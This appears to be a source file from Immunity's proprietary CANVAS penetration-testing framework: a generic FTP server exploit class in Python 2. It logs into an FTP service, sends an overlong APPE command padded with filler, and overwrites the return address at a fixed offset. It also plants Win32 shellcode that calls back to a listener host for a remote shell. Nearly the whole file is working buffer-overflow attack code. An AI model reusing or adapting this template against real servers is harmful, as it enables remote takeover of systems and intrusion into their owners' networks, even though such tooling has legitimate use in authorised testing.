#! /usr/bin/env python

#
# CANVAS generic FTPD Exploit
#

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path:
    sys.path.append(".")


import os,getopt
import socket
from exploitutils import *


from tcpexploit import tcpexploit
import canvasengine
import time


class ftpexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.port=21
        self.user="anonymous"
        self.password="hello@example.com"
        self.host=""
        self.shellcode="\xcc" * 298
        self.badstring=self.default_badstrings["ftp"]
        self.ssl=0
        self.setVersions()
        self.version=1
        #these are the basic variables for a simple FTP exploit
        self.verb="APPE"
        self.prefix=""
        self.postfix=""
        self.attackchar="A"
        self.attacklen=1024
        self.eiploc=1000
        self.shellloc=1024     
    
        return
    
    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]
    
    def createShellcode(self):
        host=self.callback.ip
        port=self.callback.port
        return self.createWin32Shellcode(self.badstring,host,port)
    
    def getargs(self):
        """
        Get the arguments for the attack
        """
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        self.user=self.argsDict.get("user",self.user)
        self.password=self.argsDict.get("password",self.password)
        self.log("Using username %s and password %s"%(self.user,self.password))
        return

        
    def test(self):
        """
        
        """
        self.getargs()
        if self.ftplogin(banner=self.vulnbanner):
            self.version=1 #our only version for now
            return 1
        return 0
    
    def makerequest(self):
        """
        Creates the request we are going to send 
        """
        sploitstring=self.makesploit()
        request=self.verb+" "+sploitstring
        return request
        
    def run(self):
        self.getargs()
        self.host=self.target.interface
        
        self.setInfo("%s attacking %s:%d (in progress)"%(self.name,self.host,self.port))

        if self.version==0:
            self.test()
            if self.version==0:
                self.log("Automatic versioning failed.")
                self.setInfo("%s attacking %s:%d - done (failed!)"%(self.name,self.host,self.port))
                return 
            
        self.log("Attacking %s:%d"%(self.host,self.port))
        sploitstring=self.makerequest()
        s=self.ftplogin()
        if not s:
            return 0
        s.sendall("%s\r\n"%sploitstring)
        time.sleep(2)
        if self.ISucceeded():
            self.setInfo("%s attacking %s:%d - done (success!)"%(self.name,self.host,self.port))
            return 1
        self.setInfo("%s attacking %s:%d - done (failed)"%(self.name,self.host,self.port))
        return 0
        
    def makesploit(self):
        """
        Construct the attack
        """

        geteip=self.versions[self.version][1]
        sploitstring=self.prefix+self.attackchar*self.attacklen+self.postfix
        
        if self.eiploc!=None:
            sploitstring=stroverwrite(sploitstring, intel_order(geteip), self.eiploc)
        if self.shellloc!=None:
            sploitstring=stroverwrite(sploitstring, self.shellcode, self.shellloc)
        self.log("sploitstring: %s"%prettyprint(sploitstring))
        return sploitstring



if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    
